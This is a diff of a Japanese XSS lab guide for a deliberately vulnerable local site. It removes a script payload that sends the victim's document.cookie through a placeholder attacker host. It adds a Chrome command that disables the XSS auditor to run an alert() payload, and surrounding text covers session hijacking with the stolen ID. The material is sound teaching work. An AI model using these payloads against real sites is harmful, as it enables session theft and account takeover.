@@ -47,8 +47,10 @@ $ browser http://localhost:5000
 1. 攻撃者サイトにリダイレクトされ，攻撃者サイトに脆弱サイトのCookieが表示される(表示されるということは，その文字列を攻撃者サーバに保存することも容易)
 
 ```bash
-$ browser http://当日教える.com/?confirm=<script>window.location="http://localhost:5000/?sid="+edocument.cookie</script>
+$ google-chrome --disable-xss-auditor "http://localhost:5000/status?uid=%3Cscript%3Ealert(%22hoge%22)%3C/script%3E"
 ```
+
+_注意: まともなブラウザなら，単純なXSS攻撃は検知して<script>実行を中止する．`--disable-xss-auditor`によってchromeにわざとXSS攻撃に引っかかってもらう．_
 
 ### Cookie中のセッションIDを使って脆弱サイトにログイン
 
